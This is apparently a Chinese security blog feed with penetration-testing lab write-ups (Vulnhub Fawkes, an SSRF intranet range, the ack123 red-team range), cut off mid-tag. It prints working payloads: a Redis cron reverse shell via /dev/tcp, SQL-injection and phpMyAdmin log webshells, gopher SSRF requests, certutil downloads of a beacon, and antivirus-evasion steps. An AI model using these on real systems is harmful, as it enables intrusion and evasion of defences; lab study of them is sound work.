class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 port 21</span><br></pre></td></tr></table></figure><p>发现一个账号密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092107659.png"></p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：neville</span><br><span class="line">密码： bL!Bsg3k</span><br></pre></td></tr></table></figure><h2 id="宿主机提权"><a href="#宿主机提权" class="headerlink" title="宿主机提权"></a>宿主机提权</h2><p>尝试登录ssh,22端口应该是宿主机的ssh端口，2222是容器的端口被映射出来</p><p>这里ip正确，是宿主机</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092109131.png"></p><p>找到第二个flag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092112207.png"></p><p>提全三板斧，suid sudo 内核均无果，看了wp发现是sudo存在漏洞可以提权</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092116491.png"></p><p>找到<a href="https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py">exp</a>,靶机出网就wget，不出网直接复制下来替换sudo路径</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092120149.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092120153.png"></p><p>执行exp</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092122371.png"></p><p>参考来自：这位师傅的wp<a href="https://blog.csdn.net/qq_63844103/article/details/127275133?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-127275133-blog-124653850.pc_relevant_3mothn_strategy_and_data_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-127275133-blog-124653850.pc_relevant_3mothn_strategy_and_data_recovery&utm_relevant_index=2">链接</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;靶场来自 &lt;a href=&quot;https://www.vulnhub.com/entry/harrypotter-fawkes,686/&quot;&gt;https://www.vulnhub.com/entry/harrypotter-fawkes,686/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;攻击机：kali 192.168.31.118 靶机：192.168.31.132&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;对靶机进行信息收集&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="HARRYPOTTER系列" scheme="https://syst1m.top/tags/HARRYPOTTER%E7%B3%BB%E5%88%97/"/>
    
    <category term="缓存区溢出" scheme="https://syst1m.top/tags/%E7%BC%93%E5%AD%98%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>ssrf打穿内网</title>
    <link href="https://syst1m.top/2022/11/03/ssrf%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/"/>
    <id>https://syst1m.top/2022/11/03/ssrf%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/</id>
    <published>2022-11-03T09:51:47.000Z</published>
    <updated>2022-12-05T06:33:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看到国光师傅的文章，复现一遍，靶场搭建来自 <a href="https://github.com/Duoduo-chino/ssrf_vul">https://github.com/Duoduo-chino/ssrf_vul</a></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041403610.png"></p><h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041415547.png"></p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="ssrf探测内网端口"><a href="#ssrf探测内网端口" class="headerlink" title="ssrf探测内网端口"></a>ssrf探测内网端口</h2><p>访问首页</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041417378.png"></p><p>用file协议测试ssrf</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041418913.png"></p><p>探测内网信息,确定是在内网中，可以对其他网段进行探测</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041439697.png"></p><p>用http协议测试</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041435616.png"></p><p>用dict协议探测内网信息，dict协议一般只能探测出一些带tcp回显的端口，使用bp迭代爆破</p><p>选定爆破变量为d段和端口</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041447899.png"></p><p>payload1，d段ip</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041458112.png"></p><p>payload2 常用端口</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041459036.png"></p><p>爆破出开放端口情况</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041502156.png"></p><p>整理一下（国光师傅给出的端口开放情况），实际这里是docker搭建会有差别，没有探测到3306，靶机也只开放了7个</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.72.23.21</span> - <span class="number">80</span></span><br><span class="line"><span class="number">172.72.23.22</span> - <span class="number">80</span></span><br><span class="line"><span class="number">172.72.23.23</span> - <span class="number">80</span>、<span class="number">3306</span></span><br><span class="line"><span class="number">172.72.23.24</span> - <span class="number">80</span></span><br><span class="line"><span class="number">172.72.23.25</span> - <span class="number">80</span></span><br><span class="line"><span class="number">172.72.23.26</span> - <span class="number">8080</span></span><br><span class="line"><span class="number">172.72.23.27</span> - <span class="number">6379</span></span><br><span class="line"><span class="number">172.72.23.28</span> - <span class="number">6379</span></span><br><span class="line"><span class="number">172.72.23.29</span> - <span class="number">3306</span></span><br></pre></td></tr></table></figure><h2 id="22代码执行"><a href="#22代码执行" class="headerlink" title="22代码执行"></a>22代码执行</h2><p>这里存在一个代码执行，使用http协议用burp去爆破目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041530587.png"></p><p>爆破出phpinfo和一个webshell</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041519496.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041530860.png"></p><p>拿着webshell执行命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041532815.png"></p><p>要注意，这里执行命令如果用空格需要用URL编码空格</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041533490.png"></p><p>如果再bp中需要进行两次编码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041535319.png"></p><h2 id="23sql注入"><a href="#23sql注入" class="headerlink" title="23sql注入"></a>23sql注入</h2><p>http协议探测23，直接告诉我们sql注入</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211041537788.png"></p><p>抓包注入，这里用&#x2F;**&#x2F;代替空格，可以免去二次url编码，%2523为#的两次编码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071652939.png"></p><p>发现是root尝试直接写webshell</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071654895.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071716824.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="regexp">//</span><span class="number">172.72</span>.<span class="number">23.23</span><span class="regexp">/?id=1&#x27;/</span>**<span class="regexp">/union/</span>**<span class="regexp">/select/</span>**<span class="regexp">/1,2,3,&#x27;&lt;?php%2520system($_GET[1]);%2520?&gt;&#x27;/</span>**<span class="regexp">/into/</span>**<span class="regexp">/dumpfile/</span>**<span class="regexp">/&#x27;/</span>var<span class="regexp">/www/</span>html/x.php<span class="string">&#x27;%2523</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071717430.png"></p><h2 id="24命令执行"><a href="#24命令执行" class="headerlink" title="24命令执行"></a>24命令执行</h2><p>很经典的一个rce</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071721953.png"></p><p>但是这里是post发包，要用gopher协议去发包</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071722528.png"></p><p>关于gopher协议详细介绍 <a href="https://www.freebuf.com/articles/web/337824.html">https://www.freebuf.com/articles/web/337824.html</a></p><p>构造一个post数据包，删除这一行，否则会被两次gzip编码</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Accept</span>-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure><p>构造一个简单的数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">host</span><span class="punctuation">: </span>172.72.23.24</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>19</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">ip</span><span class="operator">=</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="comment">;whoami</span></span></span><br></pre></td></tr></table></figure><p>再将整个数据包用url编码两次，编码两次的数据包就是最终的tcp数据流</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071845620.png"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="symbol">gopher:</span>//&lt;host&gt;<span class="symbol">:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP</span>数据流&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071844333.png"></p><h2 id="25XXE"><a href="#25XXE" class="headerlink" title="25XXE"></a>25XXE</h2><p>跟命令执行差不多</p><h2 id="26tomcat"><a href="#26tomcat" class="headerlink" title="26tomcat"></a>26tomcat</h2><p>也是一样，URL编码两次以后用gopher协议去发包</p><h2 id="27-Redis未授权"><a href="#27-Redis未授权" class="headerlink" title="27 Redis未授权"></a>27 Redis未授权</h2><p>内网的 172.72.23.27 主机上的 6379 端口运行着未授权的 Redis 服务，系统没有 Web 服务（无法写 Shell），无 SSH 公私钥认证（无法写公钥），所以这里攻击思路只能是使用定时任务来进行攻击了。常规的攻击思路的主要命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清空 key</span></span><br><span class="line">flushall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置要操作的路径为定时任务目录</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置定时任务角色为 root</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置定时任务内容</span></span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存操作</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>命令格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://ip:port/redis命令</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071847051.png"></p><p>写计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清空 key</span></span><br><span class="line">dict://172.72.23.27:6379/flushall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置要操作的路径为定时任务目录</span></span><br><span class="line">dict://172.72.23.27:6379/config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在定时任务目录下创建 root 的定时任务文件</span></span><br><span class="line">dict://172.72.23.27:6379/config <span class="built_in">set</span> dbfilename root</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入 Bash 反弹 shell 的 payload</span></span><br><span class="line">dict://172.72.23.27:6379/set x <span class="string">&quot;\n* * * * * /bin/bash -i &gt;%26 /dev/tcp/x.x.x.x/2333 0&gt;%261\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存上述操作</span></span><br><span class="line">dict://172.72.23.27:6379/save</span><br></pre></td></tr></table></figure><p>接受到shell</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071852905.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;看到国光师傅的文章，复现一遍，靶场搭建来自 &lt;a href=&quot;https://github.com/Duoduo-chino/ssrf_vul&quot;&gt;https://github.com/Duoduo-chino/ssrf_vul&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202211041403610.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;靶场搭建&quot;&gt;&lt;a href=&quot;#靶场搭建&quot; class=&quot;headerlink&quot; title=&quot;靶场搭建&quot;&gt;&lt;/a&gt;靶场搭建&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202211041415547.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ssrf" scheme="https://syst1m.top/tags/ssrf/"/>
    
    <category term="redis" scheme="https://syst1m.top/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>暗月ack123靶场打靶</title>
    <link href="https://syst1m.top/2022/09/28/%E6%9A%97%E6%9C%88ack123%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/09/28/%E6%9A%97%E6%9C%88ack123%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6/</id>
    <published>2022-09-28T07:56:37.000Z</published>
    <updated>2022-10-21T06:07:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>此靶场是月师傅九月出师考核靶场，搭建过程参考文章<a href="https://mp.weixin.qq.com/s/VB4elHdrHNCmPDP_ktcLRg">红队考核靶场ack123下载和搭建</a></p><p>靶场地址：<a href="https://pan.baidu.com/s/13g_1FFg-ZYYpBwkCvKyYWQ">https://pan.baidu.com/s/13g_1FFg-ZYYpBwkCvKyYWQ</a> 提取码：7fkj</p><h2 id="拓补图"><a href="#拓补图" class="headerlink" title="拓补图"></a>拓补图</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209281557342.png"></p><h2 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h2><p>1.站库分离 外网打点</p><p>2.过360全家桶</p><p>3.过windwos defender</p><p>4.过火绒</p><p>5.内网漫游</p><p>6.多层网络渗透</p><p>7.横向渗透</p><p>8.jwt token密钥破解</p><p>9.权限提升</p><p>10.域渗透</p><p>11.phpmyadmin写shell</p><p>12.sqlserver 提权</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>这里本来要使用frp内网穿透出去，但是太慢了也不太稳定，索性直接添加一张网卡，桥接模式复制物理地址</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>访问首页，发现cms信息</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011643555.png"></p><p>对靶机进一步扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011647992.png"></p><p>扫出后台地址</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011653183.png"></p><p>手动尝试几个密码无果</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011654204.png"></p><p>注册一个账号看看，得到服务器信息，和编辑器版本</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011656152.png"></p><h2 id="UEditor-1-4-3-任意文件上传getshell"><a href="#UEditor-1-4-3-任意文件上传getshell" class="headerlink" title="UEditor 1.4.3 任意文件上传getshell"></a>UEditor 1.4.3 任意文件上传getshell</h2><p>google到此编辑器版本存在任意上传 <a href="https://www.cnblogs.com/sup3rman/p/13071382.html">UEditor 1.4.3 任意文件上传getshell</a></p><p>制作上传html的文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage&quot;</span><span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再生成一个图片马到本地（不要改成aspx后缀），通过CententType来校验文件是否为图片，再根据文件名最后的后缀作为后缀</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011814372.png"></p><p>利用python在马子的目录起一个http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p><code>此处有大坑，不要把图片马的名字改为xx.png?.aspx!!</code>,因为这里如果改成了这个名字，?会被url编码成ma.png%3F.aspx,就会被过滤</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011845376.png"></p><p>但是不经过url编码，直接修改为ma.png?.aspx,会报错404</p><p>应该就在输入框中加入后缀?.aspx</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011838028.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011839118.png"></p><p>冰蝎连接</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011857708.png"></p><h1 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>存在360</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011900570.png"></p><p>存在多个网段</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011901885.png"></p><p>上线到msf提权，也可以上线到cs</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011912448.png"></p><p>提权到system</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011912454.png"></p><h2 id="站库分离打点"><a href="#站库分离打点" class="headerlink" title="站库分离打点"></a>站库分离打点</h2><p>这里上线到cs使用Erebus插件里的烂土豆提权到system</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210012024620.png"></p><p>查看进程和服务，发现存在mysql，但是并没有sqlserver，由上面我们得到的信息，这个web服务器的数据库应该是sqlserver，那么应该是站库分离</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021525041.png"></p><p>对内网存活主机进行端口扫描，发现sqlserver</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210012058674.png"></p><p>猜测22网段的存活主机，就是这台web服务器的数据库，翻翻配置文件，找到sqlserver账号密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021530350.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021530400.png"></p><p>msf添加隧道</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021534613.png"></p><p>再起一个代理,方便给其他工具使用</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021536538.png"></p><p>使用msf自带的模块执行xp_cmdshell,成功执行命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021538700.png"></p><p>使用无文件落地上线到cs上发现一直没反应，应该是调用pwershell被杀软拦截了,再使用certutil远程下载也被火绒拦截</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -<span class="built_in">split</span> -f http://192.168.31.118/beacon.exe C:\Windows\Temp\test.exe</span><br></pre></td></tr></table></figure><p>重新Nacicat permium新建一个连接，要用Proxifier走一下kali起的代理</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021714979.png"></p><p>xp_cmdshell默认关闭的，需要手动开启</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#启用xp_cmdshell</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">#关闭xp_cmdshell</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">0</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">#恢复<span class="operator">/</span>删除xp_cmdshell</span><br><span class="line"><span class="keyword">EXEC</span> sp_addextendedproc xp_cmdshell,<span class="variable">@dllname</span><span class="operator">=</span><span class="string">&#x27;xplog70.dll&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_dropextendedproc <span class="string">&#x27;xplog70.dll&#x27;</span>;</span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> master..xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021722115.png"></p><p>发现杀软，这个命令在kali上执行是报错的可能是回显太长了？</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021724777.png"></p><p>cs直接生成无文件落地，调用pwershell或者直接使用certutil去下载远程后门，都会被火绒拦截</p><p>解决办法来自这篇文章 <a href="https://xz.aliyun.com/t/9265">记一次利用mssql上线</a>，这里我直接使用工具MDUT上的com组件方便一点，也需要走代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Windows\System32\certutil.exe  C:\windows\temp\sethc.exe</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081509650.png"></p><p>生成免杀shell放到kali上，再用python起一个http服务，用刚刚复制的certutil.exe来下载</p><p><a href="https://github.com/yqcs/ZheTian">免杀项目</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Temp\sethc.exe -urlcache -<span class="built_in">split</span> -f <span class="string">&quot;http://192.168.31.54/pMJYrMDKRj.exe&quot;</span> C:\Windows\Temp\loader.exe</span><br></pre></td></tr></table></figure><p>运行后门，上线</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Temp\loader.exe</span><br></pre></td></tr></table></figure><p>成功bypass火绒上线</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081520743.png"></p><p>粘贴systeminfo信息到在线提权辅助工具，拿到提权可用信息，有的不准自己判断，最后还是试用Erebus插件里的烂土豆提权到system</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081527002.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081530429.png"></p><p>注入进程到一个x64进程上稳定一下后门，到此已经拿下2台主机，web服务器和数据库服务器，继续横向，继续信息收集</p><h2 id="phpmyadmin-getshell"><a href="#phpmyadmin-getshell" class="headerlink" title="phpmyadmin getshell"></a>phpmyadmin getshell</h2><p>发现存活另一台存活主机（前面没开）</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081639515.png"></p><p>存在80端口，用最开始msf起的socks5代理浏览器访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081639116.png"></p><p>登录抓个包，发现熟悉的jwt格式密文</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081643466.png"></p><p>加密需要秘钥</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081711696.png"></p><p>用工具来跑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ticarpi/jwt_tool.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> jwt_tool</span><br><span class="line"></span><br><span class="line">python3 -m pip install -r requirements.txt</span><br><span class="line"></span><br><span class="line">python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC8xMC4xMC4xLjEzNSIsImF1ZCI6Imh0dHA6XC9cLzEwLjEwLjEuMTM1IiwiaWF0IjoxNjQyMTY0MDA2LCJuYmYiOjE2NDIxNjQwMTYsImV4cCI6MTY0MjE2NDYwNiwiZGF0YSI6eyJ1c2VyaWQiOjEsInVzZXJuYW1lIjoiZGVtbyJ9fQ.mgbBNSJL1MTGep8eJTqfvH-1Zf6F82_Lvp19eGlr0DA -C -d /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>跑出秘钥 Qweasdzxc5</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081726972.png"></p><p>看了公开wp才知道考点在这个响应头，可以google到phpstudy版本，从而得到phpmyadmin路径 url&#x2F;phpmyadmin4.8.5（感觉很无厘头。。）</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081733978.png"></p><p>root&#x2F;Qweasdzxc5 登录成功</p><p>phpmyadmin 日志包含写马</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#查询是否开启日志功能</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span> </span><br><span class="line">#开启日志并修改保存路径</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="string">&#x27;on&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:\\phpstudy_pro\\WWW\\shell.php&#x27;</span>;</span><br><span class="line">#写入shell</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;]); ?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>蚁剑走代理连接</p><p><img 